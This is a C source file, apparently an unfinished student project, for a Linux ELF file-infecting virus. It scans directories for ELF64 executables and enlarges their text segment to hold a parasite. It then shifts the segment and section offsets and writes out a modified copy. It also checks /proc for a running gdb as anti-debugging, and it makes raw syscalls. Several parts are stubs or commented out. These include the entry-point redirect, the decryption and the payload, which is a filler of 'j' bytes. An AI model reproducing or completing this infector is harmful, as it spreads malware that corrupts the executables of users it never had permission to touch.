//
// Created by Joris GOUNAND on 11/8/19.
//

#include <asm/unistd.h>
#include <asm/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
# include <stdbool.h>
#include <stdlib.h>

#include <dirent.h>
#include <elf.h>
#include <string.h>

# include <stdio.h> // DELL printfs

typedef struct	s_file
{
	int         fd;
	char		*data;
	size_t		size;
	bool        error;
}				t_file;
struct linux_dirent64 {
	long long        d_ino;    /* 64-bit inode number */
	unsigned long long        d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[]; /* Filename (null-terminated) */
};


static size_t  ft_strlen(const char *s);
static int get_env_var(char *name, char *content, int content_size);
static int open_directory(const char *path);
static void    *ft_memmove(void *dst, const void *src, size_t len);
static int     open_map(char *fname, t_file *file);
static bool process_runing(void); //CHANGER L APPELLE DE DIR
static int do_the_job(t_file *file, char *path);
static int             ft_strncmp(const char *s1, const char *s2, size_t n);
static int infect(char path[],size_t path_length);
static void new_file(t_file *file, size_t end_of_text,char *path);
#define PAGE_SIZE 4096

# define __syscall0(type,name)          \
type name(void)                         \
{                                       \
	long __res;                         \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name));\
	return (type)__res;\
}

# define __syscall1(type,name,type1,arg1)   \
type name(type1 arg1)                       \
{                                           \
	long __res;                             \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name), "b"((long)(arg1)));\
	return (type)__res;\
}

# define __syscall2(type,name,type1,arg1,type2,arg2)\
type name(type1 arg1,type2 arg2)\
{\
	long __res;                        \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name), "b"((long)(arg1)),"c"((long)(arg2)));\
	return (type)__res;\
}

# define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
type name(type1 arg1,type2 arg2, type3 arg3)\
{\
	long __res;                        \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name), "b"((long)(arg1)),"c"((long)(arg2)), "d"((long)(arg3)));\
	return (type)__res;\
}

# define __syscall4(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4)\
type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4)\
{\
	long __res;                        \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name), "b"((long)(arg1)),"c"((long)(arg2)), "d"((long)(arg3)),\
						"e"((long)(arg4)));\
	return (type)__res;\
}

__syscall0(pid_t, getpid);
__syscall0(pid_t, fork);
__syscall1(int, close, int, fd);

__syscall2(int, munmap, void *, addr, size_t, length);
__syscall2(int, fstat, int, fildes, struct stat * , buf);
__syscall2(int, rename, const char *, old, const char *, new);
__syscall2(int, kill, pid_t, pid, int, sig);

__syscall3(size_t, read, int, fd, void *, buf, size_t, count);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall3(int, getdents64, int, fd, void *, dirp,  uint, count);
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);


int main(void)
{
	pid_t pid;
	void *start;
	size_t size;
	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
	if (process_runing())
		return (1);
	start = 0; //value get from the header
	size = 0; //value get from addr
	pid = fork();
	if (pid == 0) //children
	{
		if (mprotect(start, size, PROT_WRITE | PROT_READ) == -1) {
			perror("mprotect");
			if (0)
			return -1;
		}
		//decrypt
		if (mprotect(start, size, PROT_READ | PROT_EXEC) == -1) {
			perror("mprotect");
			if (0)
			return -1;
		}
		printf("virus\n");
		printf("content: %s\n",path_env);
		get_env_var("PATH=",path_env + 21,256 - 21);
		printf("content %s\n",path_env);
		size_t path_length = ft_strlen(path_env);
		size_t i = 0;

		int length_path =0;
		do
		{
			if(path_env[i] == ':')
			{
				path_env[i] = '\0';
				//open_directory(&path[i] - length_path);
				open_directory(&path_env[i] - length_path);
				//write(1,&path[i] - length_path, length_path);
				//write(1,"\n",1);
				path_env[i] = ':';
				length_path = -1;
			}
			else if (path_env[i] == '\0')
			{
				if (length_path)
					open_directory(&path_env[i] - length_path);
				break ;
			}
			i++;
			length_path++;
		}
		while(i < path_length);

			infect(path_env, 256);
		printf("content: %s\n",path_env);
		exit (0);
	}
	//jump to original
	return (0);
}



static int get_env_var(char *name, char *content, int content_size)
{
	char buf[4];
	int fd;
	size_t n,i;
	int j,k = 0;
	int nb_start = 1;
	int name_lenght = ft_strlen(name);

	if ((fd = open("/proc/self/environ",0x0000,0))<0)
		return (0);
	do
	{
		n = read(fd,buf,4);
		for (i= 0; i < n ; ++i)
		{
			if (nb_start)
			{
				if (k != name_lenght)
				{
					if (buf[i] == name[k])
						k++;
					else
					{
						k = 0;
						nb_start = 0;
						j = 0;
					}
				}
				else if (j < content_size - 1)
				{
					if (buf[i] == '\0')
						goto  out;
					content[j++] = buf[i];
				}
				else
					goto out;
			}
			else if (buf[i] == '\0')
				nb_start = 1;
		}
	}
	while(n);
	out:
	content[j] = '\0';
	close(fd);
	return (content[0] != '\0');
}
static int open_directory(const char *path)
{
	int dd,nread;
	char buf[128];
	char path_file[256];
	t_file file;
	int i = 0;
	struct linux_dirent64 *d;
	size_t len;

	printf("directory: '%s'\n",path);

	path = "/tmp/toto";
	dd = open (path, 0x10000,0);
	if (dd < 0)
	{
		printf("open fail: '%s'\n",path);

		return 1;

	}
	printf("getdents64\n");
	nread = getdents64(dd, buf, 128);
	printf("nread %d\n",nread);
	while (i < nread)
	{
		d = (struct linux_dirent64 *) (buf + i);
		i += d->d_reclen ;
		printf("host %s type %d\n",d->d_name, d->d_type);
		if (d->d_name[0] == '.')
			continue;
		len = ft_strlen(path);
		ft_memmove(path_file,path,len);
		path_file[len] = '/';
		ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
		path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
		printf("%s %s\n",d->d_name,path_file);

		if (open_map(path_file,&file) == 0)
		{
			do_the_job(&file,path_file );
			close(file.fd);
			munmap(file.data,file.size);
			exit(4);
		}
	}
	close(dd);
	return 0;
}

static int     open_map(char *fname, t_file *file)
{
	struct stat stat;
	if ((file->fd = open (fname, 0x0008 | 0x0002, 0)) < 0)
		return 1;
	if (fstat(file->fd,&stat) == -1)
		return 1;
	file->size = stat.st_size;
	if ((file->data = mmap(0, file->size, PROT_READ| PROT_WRITE| PROT_EXEC,
	                       MAP_SHARED, file->fd, 0)) == MAP_FAILED)
		return 1;
	return 0;
}


static size_t  ft_strlen(const char *s)
{
	size_t  i;

	i = 0;
	while (*(s + i) != '\0')
	{
		i++;
	}
	return (i);
}
static void    *ft_memcpy(void *dst, const void *src, size_t n)
{
	unsigned char   *srctmp;
	unsigned char   *dsttmp;
	size_t                  i;

	srctmp = (unsigned char *)src;
	dsttmp = (unsigned char *)dst;
	i = 0;
	while (i < n)
	{
		dsttmp[i] = srctmp[i];
		i++;
	}
	return ((void *)dst);
}
static void    *ft_memmove(void *dst, const void *src, size_t len)
{
	char    *srctmp;
	char    *dsttmp;

	srctmp = (char *)src;
	dsttmp = (char *)dst;
	if (srctmp < dsttmp)
	{
		srctmp = (srctmp + len) - 1;
		dsttmp = (dsttmp + len) - 1;
		while (len-- > 0)
			*dsttmp-- = *srctmp--;
	}
	else
		ft_memcpy(dst, src, len);
	return ((void *)dst);
}
static int             ft_strncmp(const char *s1, const char *s2, size_t n)
{
	size_t  index;

	index = 0;
	while (index < n && s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	if (index >= n)
		return (0);
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}


static bool process_runing(void)
{
	DIR* dir;
	struct dirent* ent;
	char* endptr;
	char buf[256];

	if (!(dir = opendir("/proc"))) {
		perror("can't open /proc");
		return 1;
	}
	while((ent = readdir(dir)) != NULL) {
		/* if endptr is not a null character, the directory is not
		 * entirely numeric, so ignore it */
		long lpid = strtol(ent->d_name, &endptr, 10);
		if (*endptr != '\0') {
			continue;
		}

		/* try to open the cmdline file */
		snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
		FILE* fp = fopen(buf, "r");

		if (fp) {
			if (fgets(buf, sizeof(buf), fp) != NULL) {
				/* check the first token in the file, the program name */
				char* first = strtok(buf, " ");
				printf("name %s\n",first);
				if (!strcmp(first, "gdb")) {
					fclose(fp);
					closedir(dir);
					return (1);
				}
			}
			fclose(fp);
		}

	}
	return (0);
}
static int do_the_job(t_file *file, char *path)
{
	printf("debut do_the_job\n");
	Elf64_Ehdr          *header;
	Elf64_Phdr*             seg;
	Elf64_Shdr*             sec;
	size_t      parasite_size = 690;
	Elf64_Addr text;
	Elf64_Addr parasite_vaddr;
	Elf64_Addr old_e_entry;
	Elf64_Addr end_of_text;
	int text_found = 0;
	int i;
	if (file->size < sizeof(Elf64_Ehdr) || ft_strncmp(file->data, ELFMAG,SELFMAG) || file->data[EI_CLASS] != ELFCLASS64)
		return (1);

	header = (Elf64_Ehdr *)file->data;
	seg = (Elf64_Phdr*)(file->data + header->e_phoff);
	for (i = header->e_phnum; i-- > 0; seg++)
	{
		if (seg->p_type == PT_LOAD)
		{
			if (seg->p_flags == (PF_R | PF_X))
			{
				unsigned int pt = (PAGE_SIZE - 4) - parasite_size; // remplacer le 4 par la size de la signature

				//la c est le check de la signature
				// seg->p_offset + seg->p_filesz + pt

				if ("equal" && 0)
					return 1;
			}
		}
	}

	//Recupere le premier segement TEXT on lui rajoute 4096
	//puis on rajoute a tous les segment suivant 4096
	seg = (Elf64_Phdr*)(file->data + header->e_phoff);
	for (i = header->e_phnum; i-- > 0; seg++)
	{
		if (text_found)
		{
			printf("seg-.p_vaddr %llx p_offset before %llx",seg->p_vaddr, seg->p_offset);
			seg->p_offset += PAGE_SIZE;
			printf(" after %llx\n",seg->p_offset);
			continue;
		}
		else
		if (seg->p_type == PT_LOAD)
		{
			if (seg->p_flags == (PF_R | PF_X))
			{
				text = seg->p_vaddr;
				parasite_vaddr = seg->p_vaddr + seg->p_filesz;

				old_e_entry = header->e_entry;
				//header->e_entry = parasite_vaddr;
				end_of_text = seg->p_offset + seg->p_filesz;

				seg->p_filesz += parasite_size;
				seg->p_memsz += parasite_size;

				text_found++;
			}
		}
	}

	sec = (Elf64_Shdr*)(file->data + header->e_shoff);

	for (i = header->e_shnum; i-- > 0; sec++)
	{
		printf("section %llx\n",sec->sh_offset);
		if (sec->sh_offset >= end_of_text)
			sec->sh_offset += PAGE_SIZE;
		else
		if (sec->sh_size + sec->sh_addr == parasite_vaddr)
			sec->sh_size += parasite_size;
	}
	header->e_shoff += PAGE_SIZE;
	new_file(file,end_of_text, path);
	printf("fim do_the_job\n");
	return 0;
}
static int infect(char path[],size_t path_length)
{
	size_t i = 0;

	int length_path =0;
	do
	{
		if(path[i] == ':')
		{
			path[i] = '\0';
			//open_directory(&path[i] - length_path);
			open_directory(&path[i] - length_path);
			//write(1,&path[i] - length_path, length_path);
			//write(1,"\n",1);
			path[i] = ':';
			length_path = -1;
		}
		else if (path[i] == '\0')
		{
			if (length_path)
				open_directory(&path[i] - length_path);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);
	return 0;
}
static char    *only_name(char *line)
{
	int        size;
	size = ft_strlen(line);
	size++;
	while (--size)
	{
		if (line[size] == '/')
			return (&(line[size + 1]));
	}
	return (line);
}
static void new_file(t_file *file, size_t end_of_text,char *path)
{
	int fd;
	char *data;
	char tmp[125];

	for (int i = 0; i< 125;i++)
		tmp[i] = 0;
	ft_memmove(tmp,path,ft_strlen(path));

	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
	*only_name(tmp) = '.';
	printf("new_file debut %s\n",tmp);
	if ((fd = open (tmp, 0x242, 0755)) < 0)
	{

		printf("error open fd %d\n",fd);
		return ;
	}
	printf("new_file 1\n");

	if ((data = mmap(0, file->size + PAGE_SIZE, PROT_READ| PROT_WRITE| PROT_EXEC,
	                 MAP_SHARED, fd, 0)) == MAP_FAILED)
	{
		printf("error mmap\n");
		close(fd);
		return;
	}

	printf("new_file 2\n");

	///write(fd,file->data,file->size + PAGE_SIZE);

	write(fd,file->data, end_of_text);

	write(file->fd,file->data, PAGE_SIZE);

	for (int i = 0; i< PAGE_SIZE;i++)
		write(fd,"j",1);
	write(fd,file->data + end_of_text, file->size - end_of_text);
	ft_memmove(data,file->data, end_of_text);
	ft_memmove(data + PAGE_SIZE + end_of_text,file->data + end_of_text, file->size - end_of_text);
	write(1,data, 15);
	printf("tmp %s, path %s\n",tmp, path);
	close(file->fd);
	close(fd);
	munmap(file->data,file->size);
	munmap(data, file->size + PAGE_SIZE);
	int ret = rename (tmp, "/root/42_project/famine/a");
	printf("fin memove %d\n",ret);
	char argv[] = "mv /tmp/toto/.cat /tmp/toto/cat";
	system(argv);

	perror("retour");

}